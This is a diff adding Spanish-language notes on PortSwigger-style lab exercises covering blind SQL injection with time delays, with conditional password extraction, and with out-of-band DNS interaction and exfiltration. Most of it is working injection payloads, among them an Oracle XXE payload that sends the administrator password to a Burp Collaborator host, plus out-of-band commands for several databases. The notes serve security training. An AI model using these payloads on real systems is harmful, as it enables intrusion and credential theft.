@@ -392,3 +392,178 @@ awh1rah1ldpr6tzk32rt
 
 
 ![](2022-07-08-14-52-13.png)
+
+## Lab: Blind SQL injection with time delays
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.
+
+Este ejercicio solo nos pide un delay de 10 segundos y nada más...
+
+Podríamos buscar antes el tipo de base de datos pero es más rápido directamente.
+
+```bash
+Oracle	      dbms_pipe.receive_message(('a'),10)
+
+Microsoft	   WAITFOR DELAY '0:0:10'
+
+PostgreSQL	   SELECT pg_sleep(10)
+
+MySQL	         SELECT SLEEP(10)
+```
+Probamos con el primero
+```bash
+[x] oracle       ' and dbms_pipe.receive_message(('a'),10)--
+[x] Microsoft    ' and WAITFOR DELAY '0:0:10'--
+[x] PostgreSQL	  ' and select pg_sleep(10)--
+[x]MySQL	        ' and select SLEEP(10)--
+
+[x] oracle       ' || dbms_pipe.receive_message(('a'),10)--
+[x] Microsoft    ' || WAITFOR DELAY '0:0:10'--
+[v] PostgreSQL	  ' || pg_sleep(10))--
+[]MySQL	        ' || SLEEP(10)--
+```
+## Lab: Blind SQL injection with time delays and information retrieval
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+it is possible to trigger conditional time delays to infer information.
+
+users , user administrator y password
+
+Damos por hecho que los datos están bien, no vamos a volver a probarlo, lo que si vamos a ver que tipo de base de datos es.
+
+Comprobamos el tipo de base de datos
+
+'+||+pg_sleep(10)--; --> postgree
+
+
+Sabemos que es esta en postgree
+
+' || SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+
+No funciona, vamos a ponerle ()
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
+
+![](2022-07-08-19-29-36.png)
+
+### Comprobamos si existe administrator en users
+
+' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users)--
+
+Si existe 10 segundos de espera
+
+## Ver el tamaño de la contraseña
+
+
+' || (SELECT CASE WHEN (username='administrator') and (LENGTH(password)=1)THEN pg_sleep(10) ELSE pg_sleep(-1) END from users)--
+
+Con esta opción va a ir todas las opciones rápido menos cuando funcione. Lo que hay que tener claro es que esta opción es buena para el intruder pero no para comprobar que en repeater si se cuple la condición, a no ser que sepas el tamaño de la cadena.
+
+En este caso el tamaño de la contraseña es de 20
+
+![](2022-07-08-19-41-42.png)
+
+## Vamos a ver ahora la contraseña
+' || (SELECT CASE WHEN (username='administrator' and substring(password,1,1)='a')THEN pg_sleep(10) ELSE pg_sleep(-1) END from users)--;
+
+Ponemos el segundo parametro de substring como un snifer hasta 20 y el caracter como un bruteforce de alfanumericos
+
+Mostramos el tiempo de respuesta y ordenamos
+
+Una vez ordenamos boton de la derecha add coment
+
+Filtramos por solo comentados y ordenamos por posicion
+
+
+![](2022-07-09-19-50-50.png)
+2wx2fjkx21cr5rsf3ge8
+
+![](2022-07-09-19-52-23.png)
+
+## Lab: Blind SQL injection with out-of-band interaction
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.
+
+Esta es bien sencilla. Únicamente seleccionamos los diferentes tipos hasta que funcione . Ponemos la dirección de burpcollaborator y después de ejecutar descargamos... si hay una petición es esa sin pues probamos otra.
+
+```sql
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+```
+
+la siguiente técnica funciona en instalaciones de Oracle con parches completos, pero requiere privilegios elevados:
+
+```sql
+#Oracle
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+
+microsoft	
+
+exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+
+postgresql	
+
+copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+
+mysql	Las siguientes técnicas funcionan solo en Windows:
+
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+```
+
+probamos oracle 
+> cuidado con los paréntesis
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--
+
+![](2022-07-09-20-24-17.png)
+
+## Lab: Blind SQL injection with out-of-band data exfiltration
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+Es un ejercicio como los de antes. Es más podemos usar sus columnas, veremos como vemos la solución en el burpsuite dependiendo del número de solicitudes, entiendo que tendrá pocas palabras.
+
+1. saber la tecnología de base de datos y si funciona el injection
+
+```sql
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--
+```
+![](2022-07-09-20-31-37.png)
+
+Vemos que funciona por lo cual es oracle
+
+2. Vamos a ver el tamaño
+
+' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select password from users where username='administrator')||'.heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+
+si en el select le inyectamos 
+select password from users where username='administrator'
+
+![](2022-07-09-20-44-43.png)
+
+oqoyckz7kjkegmb2kxl6.heztnyh9r33dob8zc0hm7xaiy94zso.burpcollaborator.net.
+
+La primera parte antes del . es la solución al select que enviamos
+
+![](2022-07-09-20-47-34.png)
+
